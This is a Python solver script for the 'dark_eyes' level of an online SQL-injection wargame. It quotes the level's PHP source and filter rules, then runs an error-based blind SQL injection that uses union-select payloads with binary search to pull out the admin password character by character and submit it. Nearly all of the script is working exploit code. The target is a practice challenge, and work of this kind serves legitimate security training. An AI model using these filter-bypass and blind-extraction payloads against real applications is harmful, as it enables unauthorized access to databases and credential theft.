#!/usr/bin/env python3
import los


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'select id from prob_dark_eyes' in args[0]


def main():
    '''
    Dark_eyes 22

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(mysqli_error($db)) exit();
    echo "<hr>query : <strong>{$query}</strong><hr><br>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
    '''

    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
    cook = los.check_cookies(url)

    payload = "'||id='admin'&&(select 1 union select (length(pw)>%s))#"
    param = dict(pw=payload)
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        payload = f"'||id='admin'&&(select 1 union select (ord(mid(pw,{i},1))<%s))#"
        param = dict(pw=payload)
        left, num_requests = los.find_binary(url, param, check_func,
                                             32, 127, cook)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Dark_eyes Clear!')


if __name__ == '__main__':
    main()
